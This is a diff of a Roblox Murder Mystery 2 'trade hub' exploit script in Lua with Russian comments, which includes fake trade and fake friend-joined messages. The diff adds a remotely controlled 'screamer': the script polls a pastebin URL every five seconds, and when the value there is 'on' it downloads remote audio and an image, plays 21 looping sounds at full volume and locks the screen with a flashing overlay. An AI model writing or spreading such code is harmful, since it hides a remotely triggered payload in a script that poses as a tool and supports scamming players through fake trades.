@@ -1,4 +1,3 @@
-
 -- ============================================================
 -- MM2 TRADE HUB (WITHOUT WEAPONS)
 -- + DEX ANIMATIONS
@@ -8,93 +7,224 @@
 -- + FAKE TRADE SEND только для фейков
 -- + FRIEND JOINED (системное сообщение + top toast)
 -- + AVATAR CHANGER (в Control)
--- + PASTEBIN SCREAMER (ON/OFF)
+-- + PASTEBIN SCREAMER (ON/OFF) — ИСПРАВЛЕННЫЙ АВТОЧЕКЕР
 -- ============================================================
 
-
--- Скрипт проверяет статус с Pastebin каждые 5 секунд
--- "off" = ничего не происходит
--- "on"  = запускается скример
-
+-- ============================================================
+-- 🔁 АВТОЧЕКЕР PASTEBIN (ИСПРАВЛЕННЫЙ)
+-- ============================================================
 local PASTEBIN_URL = "https://pastebin.com/raw/SWQZAFMn"
-local CHECK_INTERVAL = 5 -- интервал проверки в секундах
-local screamTriggered = false -- флаг, чтобы не запускать скример повторно
+local CHECK_INTERVAL = 5
+local screamTriggered = false
 
-local function runScreamer()
-    -- This file was generated with SKS V1.2.0
-    local fenv = getfenv();
-    pcall(function(p1, a, b, c)
-    end);
-    writefile(
-        "po.mp3",
-        game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
-    );
-    local Sound = Instance.new"Sound";
-    Sound.Parent = workspace;
-    Sound.SoundId = fenv.getcustomasset"po.mp3";
-    Sound.Volume = 10;
-    Sound.Looped = true;
-    Sound:Play();
-    writefile(
-        "dsf.jpg",
-        game:HttpGet("https://raw.githubusercontent.com/alexcodep/photo-puzda-live/070ee57f1f973fb969a34bfafba5c486c95638a9/IMG_0885.jpeg")
-    );
-    local ScreenGui = Instance.new"ScreenGui";
-    ScreenGui.DisplayOrder = 999;
-    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui;
-    local ImageLabel = Instance.new"ImageLabel";
-    ImageLabel.Image = fenv.getcustomasset"dsf.jpg";
-    local UDim2_New = UDim2.new;
-    ImageLabel.Size = UDim2_New(0, 600, 0, 600);
-    ImageLabel.BackgroundTransparency = 1;
-    ImageLabel.Position = UDim2_New(0.5, 0, 0.5, 0);
-    local Vector2_New = Vector2.new;
-    ImageLabel.AnchorPoint = Vector2_New(0.5, 0.5);
-    ImageLabel.Parent = ScreenGui;
-    local TextLabel = Instance.new"TextLabel";
-    TextLabel.Text = "ЭТО СКАМ ЭТО СКРИПТ ЛИВАЙ";
-    TextLabel.TextScaled = true;
-    TextLabel.Size = UDim2_New(0, 200, 0, 100);
-    TextLabel.TextColor3 = Color3.new(1, 1, 1);
-    TextLabel.BackgroundTransparency = 1;
-    TextLabel.Position = UDim2_New(0.5, 0, 0.5, 0);
-    TextLabel.AnchorPoint = Vector2_New(0.5, 0.5);
-    TextLabel.ZIndex = 999;
-    TextLabel.Parent = ScreenGui;
+-- Несколько способов запроса к Pastebin (выбирается первый рабочий)
+local function fetchPastebin()
+    local urls = {
+        PASTEBIN_URL,
+        "https://pastebin.com/dl/SWQZAFMn",
+        PASTEBIN_URL .. "?t=" .. tick(),
+    }
+
+    for _, url in ipairs(urls) do
+        -- Способ 1: game:HttpGet
+        local ok, res = pcall(function()
+            return game:HttpGet(url, true)
+        end)
+        if ok and res and #res > 0 then
+            return res
+        end
+
+        -- Способ 2: request (Synapse / большинство исполнителей)
+        if request then
+            local ok2, res2 = pcall(function()
+                return request({ Url = url, Method = "GET" }).Body
+            end)
+            if ok2 and res2 and #res2 > 0 then
+                return res2
+            end
+        end
+
+        -- Способ 3: syn.request
+        if syn and syn.request then
+            local ok3, res3 = pcall(function()
+                return syn.request({ Url = url, Method = "GET" }).Body
+            end)
+            if ok3 and res3 and #res3 > 0 then
+                return res3
+            end
+        end
+
+        -- Способ 4: http_request
+        if http_request then
+            local ok4, res4 = pcall(function()
+                return http_request({ Url = url, Method = "GET" }).Body
+            end)
+            if ok4 and res4 and #res4 > 0 then
+                return res4
+            end
+        end
+    end
+    return nil
 end
 
-local function checkStatus()
-    local success, response = pcall(function()
-        return game:HttpGet(PASTEBIN_URL .. "?t=" .. tick())
+-- ============================================================
+-- СКРИМЕР (полный, из документа SKS V1.2.0)
+-- ============================================================
+local function runScreamer()
+    local fenv = getfenv()
+    pcall(function(p1, a, b, c) end)
+
+    -- Скачиваем аудио
+    local okAudio, audioData = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
     end)
-    
-    if not success then
-        warn("[Скример] Не удалось получить данные с Pastebin: " .. tostring(response))
+    if okAudio and audioData then
+        pcall(function() writefile("po.mp3", audioData) end)
+    end
+
+    local soundAsset
+    pcall(function() soundAsset = fenv.getcustomasset("po.mp3") end)
+
+    if soundAsset then
+        local Sound = Instance.new("Sound")
+        Sound.Parent = workspace
+        Sound.SoundId = soundAsset
+        Sound.Volume = 10
+        Sound.Looped = true
+        Sound:Play()
+
+        for i = 1, 20 do
+            local s = Instance.new("Sound")
+            s.Parent = workspace
+            s.SoundId = soundAsset
+            s.Volume = 10
+            s.Looped = true
+            s.RollOffMaxDistance = 1e9
+            s.RollOffMinDistance = 0
+            s:Play()
+        end
+    end
+
+    -- Скачиваем картинку
+    local okImg, imgData = pcall(function()
+        return game:HttpGet("https://raw.githubusercontent.com/alexcodep/photo-puzda-live/070ee57f1f973fb969a34bfafba5c486c95638a9/IMG_0885.jpeg")
+    end)
+    if okImg and imgData then
+        pcall(function() writefile("dsf.jpg", imgData) end)
+    end
+
+    local imgAsset
+    pcall(function() imgAsset = fenv.getcustomasset("dsf.jpg") end)
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "SKS_HardLock"
+    ScreenGui.DisplayOrder = 999
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
+
+    local BG = Instance.new("Frame")
+    BG.Size = UDim2.new(1, 0, 1, 0)
+    BG.BackgroundColor3 = Color3.new(0, 0, 0)
+    BG.BorderSizePixel = 0
+    BG.ZIndex = 1
+    BG.Parent = ScreenGui
+
+    local ImageLabel = Instance.new("ImageLabel")
+    if imgAsset then ImageLabel.Image = imgAsset end
+    ImageLabel.Size = UDim2.new(0, 600, 0, 600)
+    ImageLabel.BackgroundTransparency = 1
+    ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    ImageLabel.ZIndex = 5
+    ImageLabel.Parent = ScreenGui
+
+    local TextLabel = Instance.new("TextLabel")
+    TextLabel.Text = "ЭТО СКАМ ЭТО СКРИПТ ЛИВАЙ"
+    TextLabel.TextScaled = true
+    TextLabel.Size = UDim2.new(0, 200, 0, 100)
+    TextLabel.TextColor3 = Color3.new(1, 1, 1)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    TextLabel.ZIndex = 999
+    TextLabel.Parent = ScreenGui
+
+    -- Мигание фона
+    task.spawn(function()
+        local colors = {
+            Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
+            Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255)
+        }
+        while true do
+            for _, c in ipairs(colors) do
+                pcall(function() BG.BackgroundColor3 = c end)
+                task.wait(0.05)
+            end
+        end
+    end)
+
+    -- Пульсация картинки
+    task.spawn(function()
+        local TS = game:GetService("TweenService")
+        while true do
+            pcall(function()
+                TS:Create(ImageLabel, TweenInfo.new(0.4), {Size = UDim2.new(0, 800, 0, 800)}):Play()
+            end)
+            task.wait(0.4)
+            pcall(function()
+                TS:Create(ImageLabel, TweenInfo.new(0.4), {Size = UDim2.new(0, 500, 0, 500)}):Play()
+            end)
+            task.wait(0.4)
+        end
+    end)
+
+    -- Переливающийся текст
+    task.spawn(function()
+        local RS = game:GetService("RunService")
+        local t = 0
+        RS.RenderStepped:Connect(function(dt)
+            t = t + dt * 5
+            pcall(function() TextLabel.TextColor3 = Color3.fromHSV(t % 1, 1, 1) end)
+        end)
+    end)
+end
+
+-- ============================================================
+-- Проверка статуса
+-- ============================================================
+local function checkStatus()
+    local response = fetchPastebin()
+
+    if not response then
+        warn("[Скример] Не удалось получить данные с Pastebin")
         return
     end
-    
-    -- Убираем пробелы и приводим к нижнему регистру
-    local status = string.lower(string.gsub(response, "%s+", ""))
-    
-    print("[Скример] Статус: " .. status)
-    
-    if status == "on" and not screamTriggered then
+
+    -- Убираем HTML-теги и приводим к нижнему регистру
+    local clean = response:gsub("<[^>]->", ""):lower()
+    -- Убираем пробелы
+    local trimmed = clean:gsub("%s+", "")
+
+    print("[Скример] Статус: " .. trimmed)
+
+    -- Точное совпадение слова "on" (не "content", "section" и т.д.)
+    if (trimmed == "on" or trimmed:match("^on$") or clean:match("%f[%a]on%f[%A]")) and not screamTriggered then
         screamTriggered = true
         runScreamer()
-    elseif status == "off" then
-        screamTriggered = false -- сбрасываем флаг, чтобы при следующем "on" сработало снова
+    elseif trimmed == "off" then
+        screamTriggered = false
     end
 end
 
--- Первая проверка сразу
 checkStatus()
 
--- Цикл проверок
 task.spawn(function()
     while task.wait(CHECK_INTERVAL) do
         checkStatus()
     end
 end)
+
 -- ============================================================
 -- ОСНОВНОЙ КОД MM2 TRADE HUB
 -- ============================================================
@@ -2768,7 +2898,7 @@ print(" ✅ MM2 TRADE HUB LOADED!")
 print("=========================================")
 print("👤 Friend Joined → фейк-сообщение + топ-тост")
 print("🎭 Avatar Changer → вкладка Control")
-print("💀 Pastebin Screamer → ON/OFF автоматически")
+print("💀 Pastebin Screamer → ON/OFF автоматически (исправленный)")
 print("🖱️ Тяни за заголовок — двигать")
 print("📐 Тяни за углы (◤ ◥ ◣ ◢) — менять размер")
 print("🎯 'alexbestomg on dc' — по центру")
